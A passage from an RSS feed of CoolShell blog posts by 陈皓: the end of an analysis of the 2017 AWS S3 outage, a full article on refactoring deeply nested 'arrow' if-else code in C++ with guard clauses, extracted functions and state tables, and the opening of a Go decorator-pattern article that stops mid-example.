<p style="padding-left: 30px;">虽然整个S3的是做过充分的故障设计的（注：AWS的七大Design Principle 之一 Design for Failure）—— 就算是最核心的组件或服务出问题了，系统也能恢复。但是，可能是在过去的日子里 S3 太稳定了，所以，AWS 在很长很长一段时间内都没有重启过 S3 的核心服务，而过去这几年，S3 的数据对象存储级数级的成长（S3存了什么样数量级的对象，因为在Amazon工作过，所以多大概知道是个什么数量级，这里不能说，不过，老实说，很惊人的），所以，这两个核心服务在启动时要重建并校验对象索引元数据的完整性，这个过程没想到花了这么长的时候。而Placement服务系统依赖于Index 服务，所以花了更长的时间。</p>
<p>了解过系统底层的技术人员应该都知道这两个服务有多重要，简而言之，这两个系统就像是Unix/Linux文件系统中的inode，或是像HDFS里的node name，如果这些元数据丢失，那么，用户的所有数据基本上来说就等于全丢了。</p>
<p>而要恢复索引系统，就像你的操作系统从异常关机后启动，文件系统要做系统自检那样，硬盘越大，文件越多，这个过程就越慢。</p>
<p>另外，这次，AWS没有使用像以前那样 Outage 的故障名称，用的是 “Increased Error Rate” 这样的东西。我估计是没有把所有这两个服务删除完，估计有些用户是可以用的，有的用户是则不行了。</p>
<h4>后续改进</h4>
<p>在这篇故障简报中，AWS 也提到了下面的这些改进措施——</p>
<p>1）<strong>改进运维操作工具</strong>。对于此次故障的运维工具，有下面改进：</p>
<ul>
<li>
<strong>让删除服务这个操作变慢一些</strong>（陈皓注：这样错了也可以有时间反悔，相对于一个大规模的分布式系统，这招还是很不错的，至少在系统报警时有也可以挽救）</li>
</ul>
<ul>
<li>
<strong>加上一个最小资源数限制的SafeGuard</strong>（陈皓注：就是说，任何服务在运行时都应该有一个最小资源数，分布式集群控制系统会强行维护服务正常运行的最小的一个资源数）</li>
</ul>
<ul>
<li>举一反三，Review所有和其它的运维工具，保证他们也相关的检查。</li>
</ul>
<p>2）<strong>改进恢复过程。</strong>对于恢复时间过长的问题，有如下改进：</p>
<ul>
<li>
<strong>分解现有厚重的重要服务成更小的单元</strong>（在 AWS，Service是大服务，小服务被称之为 Cell），AWS 会把这几个重要的服务重构成 Cell服务。（陈皓注：这应该就是所谓的“微服务”了吧）。这样，服务粒度变小，重启也会快一些，而且还可以减少故障面（原文：blast radius – 爆炸半径）</li>
</ul>
<ul>
<li>
<strong>今年内完成对 Index 索引服务的分区计划</strong>。</li>
</ul>
<p> </p>
<h4>相关思考</h4>
<p>下面是我对这一故障的相关思考——</p>
<p>0）<strong>太喜欢像Gitlab和AWS这样的故障公开了</strong>，那怕是一个自己人为的低级错误。不掩盖，不文过饰非，透明且诚恳。Cool!</p>
<p>1）这次事件，还好没有丢失这么重要的数据，不然的话，将是灾难性的。</p>
<p>2）另外，面对在 US-EASE-1 这个老牌 Region 上的海量的对象，而且能在几个小时内恢复，很不容易了。</p>
<p>3）这个事件，再次映证了我在《<a href="https://coolshell.cn/articles/17459.html">关于高可用的系统</a>》中提到的观点：<strong>一个系统的高可用的因素很多，不仅仅只是系统架构，更重要的是——高可用运维</strong>。</p>
<p>4）<strong>对于高可用的运维，平时的故障演习是很重要的。</strong>AWS 平时应该没有相应的故障演习，所以导致要么长期不出故障，一出就出个大的让你措手不及。这点，Facebook就好一些，他们每个季度扔个骰子，随机关掉一个IDC一天。Netflix 也有相关的 Chaos Monkey，我以前在的路透每年也会做一次大规模的故障演练——灾难演习。</p>
<p>5）AWS对于后续的改进可以看出他的技术范儿。可以看到其改进方案是用技术让自己的系统更为的高可用。然后，对比国内的公司对于这样的故障，基本上会是下面这样的画风：</p>
<p style="padding-left: 30px;">a）加上更多更为严格的变更和审批流程，</p>
<p style="padding-left: 30px;">b）使用限制更多的权限系统和审批系统</p>
<p style="padding-left: 30px;">c）使用更多的人来干活（一个人干事，另一个人在旁边看）</p>
<p style="padding-left: 30px;">d）使用更为厚重的测试和发布过程</p>
<p style="padding-left: 30px;">e）惩罚故障人，用价值观教育工程师。</p>
<p>这还是我老生长谈的那句话——<strong>如果你是一个技术公司，你就会更多的相信技术而不是管理。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题</strong>。（注意：这里我并没有隔离技术和管理，只是更为倾向于用技术解决问题）</p>
<p><strong>最后，你是要建一个 “高可用的技术系统” ，还是一个 “高用的管理系统”？ ;-)</strong></p>
<p>（全文完）</p>
<p> </p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-03-03T14:20:03+08:00</pubDate>
<guid>https://coolshell.cn/articles/17737.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 如何重构“箭头型”代码 ]]></title>
<link>https://coolshell.cn/articles/17757.html</link>
<content><![CDATA[ 
<p>本文主要起因是，一次在微博上和朋友关于嵌套好几层的if-else语句的代码重构的讨论（<a href="https://weibo.com/1401880315/ECmCW0oy2" target="_blank" rel="noopener noreferrer">微博原文</a>），在微博上大家有各式各样的问题和想法。按道理来说这些都是编程的基本功，似乎不太值得写一篇文章，不过我觉得很多东西可以从一个简单的东西出发，到达本质，所以，我觉得有必要在这里写一篇的文章。不一定全对，只希望得到更多的讨论，因为有了更深入的讨论才能进步。</p>
<p>文章有点长，我在文章最后会给出相关的思考和总结陈词，你可以跳到结尾。</p>
<p>所谓箭头型代码，基本上来说就是下面这个图片所示的情况。</p>
<p><img alt="image placeholder" ></p>
<p>那么，这样“箭头型”的代码有什么问题呢？看上去也挺好看的，有对称美。但是……</p>
<p>关于箭头型代码的问题有如下几个：</p>
<p><span id="more-17757"></span></p>
<p>1）我的显示器不够宽，箭头型代码缩进太狠了，需要我来回拉水平滚动条，这让我在读代码的时候，相当的不舒服。</p>
<p>2）除了宽度外还有长度，有的代码的<code>if-else</code>里的<code>if-else</code>里的<code>if-else</code>的代码太多，读到中间你都不知道中间的代码是经过了什么样的层层检查才来到这里的。</p>
<p>总而言之，<strong>“箭头型代码”如果嵌套太多，代码太长的话，会相当容易让维护代码的人（包括自己）迷失在代码中，因为看到最内层的代码时，你已经不知道前面的那一层一层的条件判断是什么样的，代码是怎么运行到这里的，所以，箭头型代码是非常难以维护和Debug的</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%BE%AE%E5%8D%9A%E4%B8%8A%E7%9A%84%E6%A1%88%E4%BE%8B_%E4%B8%8E_Guard_Clauses" title="微博上的案例 与 Guard Clauses">微博上的案例 与 Guard Clauses</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%8A%BD%E5%8F%96%E6%88%90%E5%87%BD%E6%95%B0" title="抽取成函数">抽取成函数</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%B5%8C%E5%A5%97%E7%9A%84_if_%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81" title="嵌套的 if 外的代码">嵌套的 if 外的代码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%8A%B6%E6%80%81%E6%A3%80%E6%9F%A5%E5%B5%8C%E5%A5%97" title="状态检查嵌套">状态检查嵌套</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-5" href="#%E5%BB%B6%E4%BC%B8%E6%80%9D%E8%80%83" title="延伸思考">延伸思考</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%A3%80%E6%9F%A5%E9%94%99%E8%AF%AF" title="检查错误">检查错误</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%A3%80%E6%9F%A5%E7%8A%B6%E6%80%81" title="检查状态">检查状态</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%BE%AE%E5%8D%9A%E4%B8%8A%E7%9A%84%E6%A1%88%E4%BE%8B_%E4%B8%8E_Guard_Clauses"></span>微博上的案例 与 Guard Clauses<span class="ez-toc-section-end"></span>
</h4>
<p>OK，我们先来看一下微博上的那个示例，代码量如果再大一点，嵌套再多一点，你很容易会在条件中迷失掉（下面这个示例只是那个“大箭头”下的一个小箭头）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">FOREACH(Ptr&lt;WfExpression&gt;, argument, node-&gt;arguments) {
    int index = manager-&gt;expressionResolvings.Keys().IndexOf(argument.Obj());
    if (index != -1) {
        auto type = manager-&gt;expressionResolvings.Values()[index].type;
        if (! types.Contains(type.Obj())) {
            types.Add(type.Obj());
            if (auto group = type-&gt;GetTypeDescriptor()-&gt;GetMethodGroupByName(L"CastResult", true)) {
                int count = group-&gt;GetMethodCount();
                for (int i = 0; i &lt; count; i++) { auto method = group-&gt;GetMethod(i);
                    if (method-&gt;IsStatic()) {
                        if (method-&gt;GetParameterCount() == 1 &amp;&amp;
                            method-&gt;GetParameter(0)-&gt;GetType()-&gt;GetTypeDescriptor() == description::GetTypeDescriptor&lt;DescriptableObject&gt;() &amp;&amp;
                            method-&gt;GetReturn()-&gt;GetTypeDescriptor() != description::GetTypeDescriptor&lt;void&gt;() ) {
                            symbol-&gt;typeInfo = CopyTypeInfo(method-&gt;GetReturn());
                            break;
                        }
                    }
                }
            }
        }
    }
}
</pre>
<p>上面这段代码，可以把条件反过来写，然后就可以把箭头型的代码解掉了，重构的代码如下所示：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">FOREACH(Ptr&lt;WfExpression&gt;, argument, node-&gt;arguments) {
    int index = manager-&gt;expressionResolvings.Keys().IndexOf(argument.Obj());
    if (index == -1)  continue;
    
    auto type = manager-&gt;expressionResolvings.Values()[index].type;
    if ( types.Contains(type.Obj()))  continue;
    
    types.Add(type.Obj());

    auto group = type-&gt;GetTypeDescriptor()-&gt;GetMethodGroupByName(L"CastResult", true);
    if  ( ! group ) continue;
 
    int count = group-&gt;GetMethodCount();
    for (int i = 0; i &lt; count; i++) { auto method = group-&gt;GetMethod(i);
        if (! method-&gt;IsStatic()) continue;
       
        if ( method-&gt;GetParameterCount() == 1 &amp;&amp;
               method-&gt;GetParameter(0)-&gt;GetType()-&gt;GetTypeDescriptor() == description::GetTypeDescriptor&lt;DescriptableObject&gt;() &amp;&amp;
               method-&gt;GetReturn()-&gt;GetTypeDescriptor() != description::GetTypeDescriptor&lt;void&gt;() ) {
            symbol-&gt;typeInfo = CopyTypeInfo(method-&gt;GetReturn());
            break;
        }
    }
}
</pre>
<p>这种代码的重构方式叫 <strong>Guard Clauses</strong></p>
<ul>
<li>
<a href="https://martinfowler.com/" target="_blank" rel="noopener noreferrer">Martin Fowler</a> 的 Refactoring 的网站上有相应的说明《<a href="https://refactoring.com/catalog/replaceNestedConditionalWithGuardClauses.html" target="_blank" rel="noopener noreferrer">Replace Nested Conditional with Guard Clauses</a>》。</li>
</ul>
<ul>
<li>
<a href="https://blog.codinghorror.com/" target="_blank" rel="noopener noreferrer">Coding Horror</a> 上也有一篇文章讲了这种重构的方式 —— 《<a href="https://blog.codinghorror.com/flattening-arrow-code/" target="_blank" rel="noopener noreferrer">Flattening Arrow Code</a>》</li>
</ul>
<ul>
<li>
<a href="https://stackoverflow.com/" target="_blank" rel="noopener noreferrer">StackOverflow</a> 上也有相关的问题说了这种方式 —— 《<a href="https://stackoverflow.com/questions/356121/refactor-nested-if-statement-for-clarity" target="_blank" rel="noopener noreferrer">Refactor nested IF statement for clarity</a>》</li>
</ul>
<p>这里的思路其实就是，<strong>让出错的代码先返回，前面把所有的错误判断全判断掉，然后就剩下的就是正常的代码了</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E6%8A%BD%E5%8F%96%E6%88%90%E5%87%BD%E6%95%B0"></span>抽取成函数<span class="ez-toc-section-end"></span>
</h4>
<p>微博上有些人说，continue 语句破坏了阅读代码的通畅，我觉得他们一定没有好好读这里面的代码，其实，我们可以看到，所有的 if 语句都是在判断是否出错的情况，所以，在维护代码的时候，你可以完全不理会这些 if 语句，因为都是出错处理的，而剩下的代码都是正常的功能代码，反而更容易阅读了。当然，一定有不是上面代码里的这种情况，那么，不用continue ，我们还能不能重构呢？</p>
<p>当然可以，抽成函数：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">bool CopyMethodTypeInfo(auto &amp;method, auto &amp;group, auto &amp;symbol) 
{
    if (! method-&gt;IsStatic()) {
        return true;
    }
    if ( method-&gt;GetParameterCount() == 1 &amp;&amp;
           method-&gt;GetParameter(0)-&gt;GetType()-&gt;GetTypeDescriptor() == description::GetTypeDescriptor&lt;DescriptableObject&gt;() &amp;&amp;
           method-&gt;GetReturn()-&gt;GetTypeDescriptor() != description::GetTypeDescriptor&lt;void&gt;() ) {
        symbol-&gt;typeInfo = CopyTypeInfo(method-&gt;GetReturn());
        return false;
    }
    return true;
}

void ExpressionResolvings(auto &amp;manager, auto &amp;argument, auto &amp;symbol) 
{
    int index = manager-&gt;expressionResolvings.Keys().IndexOf(argument.Obj());
    if (index == -1) return;
    
    auto type = manager-&gt;expressionResolvings.Values()[index].type;
    if ( types.Contains(type.Obj())) return;

    types.Add(type.Obj());
    auto group = type-&gt;GetTypeDescriptor()-&gt;GetMethodGroupByName(L"CastResult", true);
    if  ( ! group ) return;

    int count = group-&gt;GetMethodCount();
    for (int i = 0; i &lt; count; i++) { auto method = group-&gt;GetMethod(i);
        if ( ! CopyMethodTypeInfo(method, group, symbol) ) break;
    }
}

...
...
FOREACH(Ptr&lt;WfExpression&gt;, argument, node-&gt;arguments) {
    ExpressionResolvings(manager, arguments, symbol)
}
...
...
</pre>
<p>你发出现，抽成函数后，代码比之前变得更容易读和更容易维护了。不是吗？</p>
<p>有人说：“如果代码不共享，就不要抽取成函数！”，持有这个观点的人太死读书了。函数是代码的封装或是抽象，并不一定用来作代码共享使用，函数用于屏蔽细节，让其它代码耦合于接口而不是细节实现，这会让我们的代码更为简单，简单的东西都能让人易读也易维护。这才是函数的作用。</p>
<h4>
<span class="ez-toc-section" id="%E5%B5%8C%E5%A5%97%E7%9A%84_if_%E5%A4%96%E7%9A%84%E4%BB%A3%E7%A0%81"></span>嵌套的 if 外的代码<span class="ez-toc-section-end"></span>
</h4>
<p>微博上还有人问，原来的代码如果在各个 if 语句后还有要执行的代码，那么应该如何重构。比如下面这样的代码。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">//原版
for(....) {
    do_before_cond1()
    if (cond1) {
        do_before_cond2();
        if (cond2) {
            do_before_cond3();
            if (cond3) {
                do_something();
            }
            do_after_cond3();
        }
        do_after_cond2();
    }
    do_after_cond1();
}</pre>
<p>上面这段代码中的那些 <code>do_after_condX()</code> 是无论条件成功与否都要执行的。所以，我们拉平后的代码如下所示：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">//重构第一版
for(....) {
    do_before_cond1();
    if ( !cond1 ) {
        do_after_cond1();
        continue
    } 
    do_after_cond1();

    do_before_cond2();
    if ( !cond2 ) { 
        do_after_cond2();
        continue;
    }
    do_after_cond2();

    do_before_cond3();
    if ( !cond3 ) {
        do_after_cond3();
        continue;
    }
    do_after_cond3();

    do_something();  
}</pre>
<p>你会发现，上面的 <code>do_after_condX</code> 出现了两份。<strong>如果 if 语句块中的代码改变了某些<code>do_after_condX</code>依赖的状态，那么这是最终版本。</strong></p>
<p>但是，如果它们之前没有依赖关系的话，根据 DRY 原则，我们就可以只保留一份，那么直接掉到 if 条件前就好了，如下所示：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">//重构第二版
for(....) {
    do_before_cond1();
    do_after_cond1();
    if ( !cond1 ) continue;
 
    do_before_cond2();
    do_after_cond2();
    if ( !cond2 ) continue;

    do_before_cond3();
    do_after_cond3();
    if ( !cond3 ) continue;

    do_something();  
}</pre>
<p>此时，你会说，我靠，居然，改变了执行的顺序，把条件放到 <code>do_after_condX()</code> 后面去了。这会不会有问题啊？</p>
<p>其实，你再分析一下之前的代码，你会发现，本来，cond1 是判断 do_before_cond1() 是否出错的，如果有成功了，才会往下执行。而 do_after_cond1() 是无论如何都要执行的。从逻辑上来说，do_after_cond1()其实和do_before_cond1()的执行结果无关，而 cond1 却和是否去执行 do_before_cond2() 相关了。如果我把断行变成下面这样，反而代码逻辑更清楚了。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">//重构第三版
for(....) {

    do_before_cond1();
    do_after_cond1();


    if ( !cond1 ) continue;  // &lt;-- cond1 成了是否做第二个语句块的条件
    do_before_cond2();
    do_after_cond2();

    if ( !cond2 ) continue; // &lt;-- cond2 成了是否做第三个语句块的条件
    do_before_cond3();
    do_after_cond3();

    if ( !cond3 ) continue; //&lt;-- cond3 成了是否做第四个语句块的条件
    do_something(); 
 
}
</pre>
<p>于是乎，在未来维护代码的时候，维护人一眼看上去就明白，代码在什么时候会执行到哪里。 这个时候，你会发现，把这些语句块抽成函数，代码会干净的更多，再重构一版：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">//重构第四版
bool do_func3() {
   do_before_cond2();
   do_after_cond2();
   return cond3;
}

bool do_func2() {
   do_before_cond2();
   do_after_cond2();
   return cond2;
}

bool do_func1() {
   do_before_cond1();
   do_after_cond1();
   return cond1;
}

// for-loop 你可以重构成这样
for (...) {
    bool cond = do_func1();
    if (cond) cond = do_func2();
    if (cond) cond = do_func3();
    if (cond) do_something();
}

// for-loop 也可以重构成这样
for (...) {
    if ( ! do_func1() ) continue;
    if ( ! do_func2() ) continue;
    if ( ! do_func3() ) continue;
    do_something();
}
</pre>
<p>上面，我给出了两个版本的for-loop，你喜欢哪个？我喜欢第二个。这个时候，因为for-loop里的代码非常简单，就算你不喜欢 continue ，这样的代码阅读成本已经很低了。</p>
<h4>
<span class="ez-toc-section" id="%E7%8A%B6%E6%80%81%E6%A3%80%E6%9F%A5%E5%B5%8C%E5%A5%97"></span>状态检查嵌套<span class="ez-toc-section-end"></span>
</h4>
<p>接下来，我们再来看另一个示例。下面的代码的伪造了一个场景——把两个人拉到一个一对一的聊天室中，因为要检查双方的状态，所以，代码可能会写成了“箭头型”。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">int ConnectPeer2Peer(Conn *pA, Conn* pB, Manager *manager)
{
    if ( pA-&gt;isConnected() ) {
        manager-&gt;Prepare(pA);
        if ( pB-&gt;isConnected() ) {
            manager-&gt;Prepare(pB);
            if ( manager-&gt;ConnectTogther(pA, pB) ) {
                pA-&gt;Write("connected");
                pB-&gt;Write("connected");
                return S_OK;
            }else{
                return S_ERROR;
            }

        }else {
            pA-&gt;Write("Peer is not Ready, waiting...");
            return S_RETRY;
        }
    }else{
        if ( pB-&gt;isConnected() ) {
            manager-&gt;Prepare();
            pB-&gt;Write("Peer is not Ready, waiting...");
            return S_RETRY;
        }else{
            pA-&gt;Close();
            pB-&gt;Close();
            return S_ERROR;
        }
    }
    //Shouldn't be here!
    return S_ERROR;
}</pre>
<p>重构上面的代码，我们可以先分析一下上面的代码，说明了，上面的代码就是对 PeerA 和 PeerB 的两个状态 “连上”， “未连上” 做组合 “状态” （注：实际中的状态应该比这个还要复杂，可能还会有“断开”、“错误”……等等状态）， 于是，我们可以把代码写成下面这样，合并上面的嵌套条件，对于每一种组合都做出判断。这样一来，逻辑就会非常的干净和清楚。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">int ConnectPeer2Peer(Conn *pA, Conn* pB, Manager *manager)
{
    if ( pA-&gt;isConnected() ) {
        manager-&gt;Prepare(pA);
    }

    if ( pB-&gt;isConnected() ) {
        manager-&gt;Prepare(pB);
    }

    // pA = YES &amp;&amp; pB = NO
    if (pA-&gt;isConnected() &amp;&amp; ! pB-&gt;isConnected()  ) {
        pA-&gt;Write("Peer is not Ready, waiting");
        return S_RETRY;
    // pA = NO &amp;&amp; pB = YES
    }else if ( !pA-&gt;isConnected() &amp;&amp; pB-&gt;isConnected() ) {
        pB-&gt;Write("Peer is not Ready, waiting");
        return S_RETRY;
    // pA = YES &amp;&amp; pB = YES
    }else if (pA-&gt;isConnected() &amp;&amp; pB-&gt;isConnected()  ) {
        if ( ! manager-&gt;ConnectTogther(pA, pB) ) {
            return S_ERROR;
        }
        pA-&gt;Write("connected");
        pB-&gt;Write("connected");
        return S_OK;
    }

    // pA = NO, pB = NO
    pA-&gt;Close();
    pB-&gt;Close();
    return S_ERROR;
}</pre>
<h4>
<span class="ez-toc-section" id="%E5%BB%B6%E4%BC%B8%E6%80%9D%E8%80%83"></span>延伸思考<span class="ez-toc-section-end"></span>
</h4>
<p>对于 <code>if-else</code> 语句来说，一般来说，就是检查两件事：<strong>错误</strong> 和 <strong>状态</strong>。</p>
<h5>
<span class="ez-toc-section" id="%E6%A3%80%E6%9F%A5%E9%94%99%E8%AF%AF"></span>检查错误<span class="ez-toc-section-end"></span>
</h5>
<p>对于检查错误来说，使用 Guard Clauses 会是一种标准解，但我们还需要注意下面几件事：</p>
<p style="padding-left: 30px;">1）当然，出现错误的时候，还会出现需要释放资源的情况。你可以使用 <code>goto fail;</code> 这样的方式，但是最优雅的方式应该是C++面向对象式的 RAII 方式。</p>
<p style="padding-left: 30px;">2）以错误码返回是一种比较简单的方式，这种方式有很一些问题，比如，如果错误码太多，判断出错的代码会非常复杂，另外，正常的代码和错误的代码会混在一起，影响可读性。所以，在更为高组的语言中，使用 <code>try-catch</code> 异常捕捉的方式，会让代码更为易读一些。</p>
<h5>
<span class="ez-toc-section" id="%E6%A3%80%E6%9F%A5%E7%8A%B6%E6%80%81"></span>检查状态<span class="ez-toc-section-end"></span>
</h5>
<p>对于检查状态来说，实际中一定有更为复杂的情况，比如下面几种情况：</p>
<p style="padding-left: 30px;">1）像TCP协议中的两端的状态变化。</p>
<p style="padding-left: 30px;">2）像shell各个命令的命令选项的各种组合。</p>
<p style="padding-left: 30px;">3）像游戏中的状态变化（一棵非常复杂的状态树）。</p>
<p style="padding-left: 30px;">4）像语法分析那样的状态变化。</p>
<p>对于这些复杂的状态变化，其本上来说，你需要先定义一个状态机，或是一个子状态的组合状态的查询表，或是一个状态查询分析树。</p>
<p><strong>写代码时，代码的运行中的控制状态或业务状态是会让你的代码流程变得混乱的一个重要原因，重构“箭头型”代码的一个很重要的工作就是重新梳理和描述这些状态的变迁关系</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>好了，下面总结一下，把“箭头型”代码重构掉的几个手段如下：</p>
<p>1）<strong>使用 Guard Clauses </strong>。 尽可能的让出错的先返回， 这样后面就会得到干净的代码。</p>
<p>2）<strong>把条件中的语句块抽取成函数</strong>。 有人说：“如果代码不共享，就不要抽取成函数！”，持有这个观点的人太死读书了。函数是代码的封装或是抽象，并不一定用来作代码共享使用，函数用于屏蔽细节，让其它代码耦合于接口而不是细节实现，这会让我们的代码更为简单，简单的东西都能让人易读也易维护，<strong>写出让人易读易维护的代码才是重构代码的初衷</strong>！</p>
<p>3）<strong>对于出错处理，使用try-catch异常处理和<a href="https://stackoverflow.com/questions/2321511/what-is-meant-by-resource-acquisition-is-initialization-raii" target="_blank" rel="noopener noreferrer">RAII机制</a></strong>。返回码的出错处理有很多问题，比如：A) 返回码可以被忽略，B) 出错处理的代码和正常处理的代码混在一起，C) 造成函数接口污染，比如像atoi()这种错误码和返回值共用的糟糕的函数。</p>
<p>4）<strong>对于多个状态的判断和组合，如果复杂了，可以使用“组合状态表”，或是状态机加Observer的状态订阅的设计模式</strong>。这样的代码即解了耦，也干净简单，同样有很强的扩展性。</p>
<p>5） <strong>重构“箭头型”代码其实是在帮你重新梳理所有的代码和逻辑，这个过程非常值得为之付出</strong>。重新整思路去想尽一切办法简化代码的过程本身就可以让人成长。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-04-05T18:07:14+08:00</pubDate>
<guid>https://coolshell.cn/articles/17757.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Go编程模式：修饰器 ]]></title>
<link>https://coolshell.cn/articles/17929.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >之前写过一篇《<a href="https://coolshell.cn/articles/11265.html" target="_blank" rel="noopener noreferrer">Python修饰器的函数式编程</a>》，这种模式很容易的可以把一些函数装配到另外一些函数上，可以让你的代码更为的简单，也可以让一些“小功能型”的代码复用性更高，让代码中的函数可以像乐高玩具那样自由地拼装。所以，一直以来，我对修饰器decoration这种编程模式情有独钟，这里写一篇Go语言相关的文章。</p>
<section class="post-series"><h3 class="post-series-title">本文是全系列中第7 / 10篇：<a href="https://coolshell.cn/articles/series/go%e7%bc%96%e7%a8%8b%e6%a8%a1%e5%bc%8f">Go编程模式</a>
</h3>
<ul class="post-series-list">
<li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21128.html">Go编程模式：切片，接口，时间和性能</a></span></li>
<li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21140.html">Go 编程模式：错误处理</a></span></li>
<li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21146.html">Go 编程模式：Functional Options</a></span></li>
<li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21214.html">Go编程模式：委托和反转控制</a></span></li>
<li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21164.html">Go编程模式：Map-Reduce</a></span></li>
<li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21179.html">Go 编程模式：Go Generation</a></span></li>
<li class="post-series-item-current post-series-item"><span class="post-series-item-title">Go编程模式：修饰器</span></li>
<li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21228.html">Go编程模式：Pipeline</a></span></li>
<li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21263.html">Go 编程模式：k8s Visitor 模式</a></span></li>
<li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21615.html">Go编程模式 ： 泛型编程</a></span></li>
</ul>
<nav class="post-series-nav"><span class="post-series-nav-prev">« <a href="https://coolshell.cn/articles/21179.html" rel="prev" title="Go 编程模式：Go Generation">上一篇文章</a></span><span class="post-series-nav-next"><a href="https://coolshell.cn/articles/21228.html" rel="next" title="Go编程模式：Pipeline">下一篇文章</a> »</span></nav></section>
<p>看过<a href="https://coolshell.cn/articles/11265.html" target="_blank" rel="noopener noreferrer">Python修饰器</a>那篇文章的同学，一定知道这是一种函数式编程的玩法——用一个高阶函数来包装一下。多唠叨一句，关于函数式编程，可以参看我之前写过一篇文章《<a href="https://coolshell.cn/articles/10822.html" target="_blank" rel="noopener noreferrer">函数式编程</a>》，这篇文章主要是，想通过从过程式编程的思维方式过渡到函数式编程的思维方式，从而带动更多的人玩函数式编程，所以，如果你想了解一下函数式编程，那么可以移步先阅读一下。所以，Go语言的修饰器编程模式，其实也就是函数式编程的模式。</p>
<p>不过，要提醒注意的是，Go 语言的“糖”不多，而且又是强类型的静态无虚拟机的语言，所以，无法做到像 Java 和 Python 那样的优雅的修饰器的代码。当然，也许是我才才疏学浅，如果你知道有更多的写法，请你一定告诉我。先谢过了。<br>
<span id="more-17929"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B" title="简单示例">简单示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#HTTP_%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%80%E4%B8%AA%E7%A4%BA%E4%BE%8B" title="HTTP 相关的一个示例">HTTP 相关的一个示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%A4%9A%E4%B8%AA%E4%BF%AE%E9%A5%B0%E5%99%A8%E7%9A%84_Pipeline" title="多个修饰器的 Pipeline">多个修饰器的 Pipeline</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%B3%9B%E5%9E%8B%E7%9A%84%E4%BF%AE%E9%A5%B0%E5%99%A8" title="泛型的修饰器">泛型的修饰器</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B"></span>简单示例<span class="ez-toc-section-end"></span>
</h4>
<p>我们先来看一个示例：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import "fmt"

func decorator(f func(s string)) func(s string) {

